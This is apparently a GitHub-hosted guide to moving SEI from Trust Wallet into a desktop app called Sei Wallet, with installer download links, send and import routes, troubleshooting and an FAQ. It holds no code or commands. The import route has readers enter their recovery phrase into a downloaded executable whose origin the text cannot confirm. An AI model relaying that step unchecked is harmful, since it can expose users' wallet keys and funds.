![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Moving SEI out of Trust Wallet into Sei Wallet</h1>

<p align="center">Get SEI out of Trust Wallet and into an account you can stake from.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Moving SEI out of Trust Wallet into Sei Wallet is a transfer between two interfaces on the same chain, not a conversion. The SEI stays native, the address changes, and the only decisions that matter are which address form you send to and whether the receiving app can sign for the account you are sending from.

Two routes exist. **Send** is a transfer: simple, irreversible, and correct if you are moving a balance. **Import** brings the phrase across so the same accounts appear in the new app, which is better if you want to keep the address your counterparties already know. They are not interchangeable, and picking the wrong one is the usual source of confusion.

## Before you touch anything

- **Confirm where your SEI actually sits.** In Trust Wallet, check the network selector: a balance that appears under one network is not visible under another, and SEI on Sei is a different entry from a wrapped SEI on Ethereum.
- **Get the destination address from the receiving app**, not from memory or from a message.
- **Check the network is Sei (chain 1329) on both sides**, before the first attempt.
- **Have enough liquid SEI for the fee** at the sending end. A fully spent balance cannot pay to move itself.

## Route 1: send it

1. Open the receiving app and copy its `0x...` address from the receive view.
2. In Trust Wallet, select the Sei network, then send.
3. Paste the address and compare the first and last four characters against the app's screen.
4. Enter a small test amount first.
5. Confirm, wait for the explorer to show success, and check the balance in the receiving app.
6. Send the remainder the same way.

Why the `0x...` form: it is what an EVM-first app signs for. Sending to a `sei1...` address is the older Cosmos-side route, which Sei's documentation places under deprecation, and an EVM wallet generally cannot complete it.

The one failure that looks like loss and is not: money moved to the `sei1...` spelling of your own account while the screen showed `0x...`. The funds are at that account, and visibility depends on the on-chain association rather than on the wallet.

## Route 2: import the phrase instead

If both wallets are EVM-first, importing reproduces the same `0x...` account, because the derivation is the same. The advantage is that your address does not change; the disadvantage is that the phrase now lives in two applications.

Steps are the ones in [the receiving app](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)'s setup: choose import rather than create, enter the words in order, set a local password, then compare the resulting address with the one Trust Wallet shows.

If the addresses differ, that is a derivation difference rather than a lost account, and adding accounts in the new app usually finds the expected one. Resist the urge to settle it with a small transfer: that pays a fee to confirm an address you already distrust.

Whichever route you take, remember that importing does not move funds and sending does not change your keys. Only one of the two changes which address your balance sits at.

## What does not apply here

**No memo.** A transfer between your own wallets needs no memo, tag or destination note. That field exists for shared exchange deposit addresses, covered separately in this set.

**No bridge.** Both wallets are reading the same chain. A bridge would be for moving an asset from another chain entirely, which is a different operation with contract risk attached.

**No approval.** A native SEI transfer is not a contract call; it needs no allowance and grants none. If a page asks you to approve spending as part of "moving" SEI, you are not moving SEI.

## If it does not arrive

1. **Is the transaction confirmed?** Exchange-style "sent" status means broadcast, not included.
2. **Was it sent on the Sei network?** A transfer broadcast on Ethereum lands on Ethereum, whatever address it names.
3. **Is it the right account?** Check both address forms of that account before concluding anything.
4. **Is the balance staked?** Staked SEI is not liquid and will not appear as a transferable balance.

If none of those explains it, the destination may simply not be yours - a completed transfer to someone else's address is final, and [the Sei Wallet exchange withdrawal guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md) article's triage sequence applies to that state as well.

## Coming from other wallets

The same shape applies elsewhere, with different interface names:

- [moving out of Keplr](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md) for a Cosmos-first wallet, where the address form question is sharper.
- [moving off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) for a Sei-native wallet, where the address usually matches.
- leaving Leap Wallet for another Cosmos-style migration.

If your Trust Wallet holds a Ledger-backed account, the sending transaction needs a device confirmation, and the receiving side must open the same derivation - a Ledger-backed account covers that pairing.

## A note on the second wallet

Running two wallets is fine; running the same phrase in both is a decision with a cost. Each application you import into is another place the phrase can leak from, and each is another surface for the approval scams that do not care which wallet you use.

A reasonable arrangement is one phrase for the balance you keep and stake, and another for day-to-day spending in apps. If you later decide to consolidate, do it by transferring, not by importing the same phrase everywhere.

## Frequently asked questions

**How do I move SEI from Trust Wallet to Sei Wallet?** Send native SEI on the Sei network to the receiving app's `0x...` address, testing with a small amount first.

**Will my address change?** If you send, yes - the balance moves to the destination address. If you import the phrase, the address stays the same.

**Does moving between my own wallets need a memo?** No. Both sides are your own accounts, so there is nothing to route.

**Why did my transfer fail?** Most often no liquid SEI for the fee, or the wrong network selected. Both are covered in the fee and network guides in this set.

**Can I reverse it if I use the wrong address?** No. Confirmed transfers are final; the recovery options are the ones in the wrong-address article.

**Can I stake after moving?** Yes, once the balance is in an EVM-first app with staking support. Staking is a separate transaction, not part of the transfer.

**Should I import or send?** Import if you need to keep the address and trust a second app with the phrase; send if you want a clean break and a new address.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Withdrawing SEI from an exchange to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md)
- [Moving SEI from Keplr to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md)
- [Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md)
